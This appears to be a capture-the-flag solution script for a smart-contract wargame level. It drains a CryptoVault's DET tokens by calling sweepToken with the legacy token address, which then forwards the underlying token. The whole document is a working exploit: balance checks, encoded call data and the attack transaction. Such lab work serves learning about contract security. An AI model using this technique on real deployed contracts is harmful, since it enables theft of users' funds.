// 1
vault = await contract.cryptoVault()

// 2
// Check initial balance (100 DET).
await contract.balanceOf(vault).then((v) => v.toString()) // 100000000000000000000

// 3
legacyToken = await contract.delegatedFrom()

// 4
// sweepTokens(...) function call data.
sweepSig = web3.eth.abi.encodeFunctionCall(
  {
    name: "sweepToken",
    type: "function",
    inputs: [{ name: "token", type: "address" }],
  },
  [legacyToken]
)

// 5
// Send exploit transaction.
await web3.eth.sendTransaction({ from: player, to: vault, data: sweepSig })

// 6
// Check balance (0 DET).
await contract.balanceOf(vault).then((v) => v.toString()) // 0
